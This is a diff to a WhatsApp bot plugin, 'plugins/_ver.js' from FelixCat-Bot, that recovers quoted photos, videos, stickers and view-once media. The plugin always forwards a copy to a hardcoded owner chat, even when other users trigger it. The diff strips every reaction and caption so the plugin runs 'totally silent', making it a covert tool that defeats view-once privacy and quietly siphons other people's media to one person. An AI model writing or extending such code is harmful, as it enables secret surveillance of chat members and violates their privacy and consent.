@@ -1,7 +1,8 @@
 // 📂 plugins/_ver.js — FelixCat-Bot 🐾
 // ver / r → recupera en el grupo (SOLO OWNER)
 // cualquier palabra → recupera y manda SOLO al privado del OWNER
-// si responde a view once → lo recupera igual y lo manda SOLO al OWNER
+// ✅ SOLO FUNCIONA SI SE CITA UNA FOTO / VIDEO / STICKER
+// 🚫 TOTALMENTE SILENCIOSO (sin reacciones ni mensajes)
 
 import fs from 'fs'
 import path from 'path'
@@ -22,7 +23,6 @@ let handler = async (m, { conn, command }) => {
   // ✅ Modo grupo solo si es owner + ver/r
   const isGroupMode = isOwner && ['ver', 'r'].includes(command)
 
-  // ✅ Si no es owner y no escribió nada → ignorar
   if (!isGroupMode && !isAnyWord) return
 
   try {
@@ -34,11 +34,13 @@ let handler = async (m, { conn, command }) => {
       q.message?.viewOnceMessageV2?.message ||
       q.message?.viewOnceMessageV2Extension?.message
 
-    let buffer, mime, type, filenameSent, sentMessage = null
+    let buffer, mime, type, filenameSent
 
     if (viewOnce) {
-      // ✅ VIEW ONCE REAL
+      // ✅ SOLO SI ES VIEW ONCE DE IMAGEN O VIDEO
       const mediaType = Object.keys(viewOnce)[0]
+      if (!/image|video/.test(mediaType)) return
+
       const mediaMsg = viewOnce[mediaType]
       mime = mediaMsg.mimetype || ''
 
@@ -51,18 +53,14 @@ let handler = async (m, { conn, command }) => {
       filenameSent = `recuperado.${mime.split('/')[1] || 'jpg'}`
 
     } else {
-      // ✅ MULTIMEDIA NORMAL
+      // ✅ SOLO SI ES IMAGEN, VIDEO O STICKER
       mime = q.mimetype || q.mediaType || ''
-      if (!/webp|image|video/g.test(mime)) return
+      if (!/webp|image|video/.test(mime)) return
 
       buffer = await q.download()
       type = mime.startsWith('video') ? 'video' : 'image'
       filenameSent = 'recuperado.' + mime.split('/')[1]
     }
-
-    // ✅ REACCIÓN PARA USUARIOS NORMALES
-    if (!isOwner) await m.react('✅')
-    if (isGroupMode) await m.react('📥')
 
     // ✅ STICKER → PNG
     if (/webp/.test(mime)) {
@@ -76,21 +74,17 @@ let handler = async (m, { conn, command }) => {
 
     // ✅ SI ES OWNER CON ver/r → MANDAR AL GRUPO
     if (isGroupMode) {
-      sentMessage = await conn.sendMessage(
+      await conn.sendMessage(
         m.chat,
-        { [type]: buffer, fileName: filenameSent, caption: '📸 Archivo recuperado.' },
+        { [type]: buffer, fileName: filenameSent },
         { quoted: null }
       )
-
-      await conn.sendMessage(m.chat, {
-        react: { text: '✅', key: sentMessage.key }
-      })
     }
 
     // ✅ SIEMPRE MANDAR COPIA AL OWNER
     await conn.sendMessage(
       OWNER_FIXED,
-      { [type]: buffer, fileName: filenameSent, caption: '📩 Archivo recuperado automáticamente.' },
+      { [type]: buffer, fileName: filenameSent },
       { quoted: null }
     )
 
@@ -126,7 +120,6 @@ let handler = async (m, { conn, command }) => {
 
   } catch (e) {
     console.error(e)
-    if (isGroupMode) await m.react('✖️')
   }
 }
 
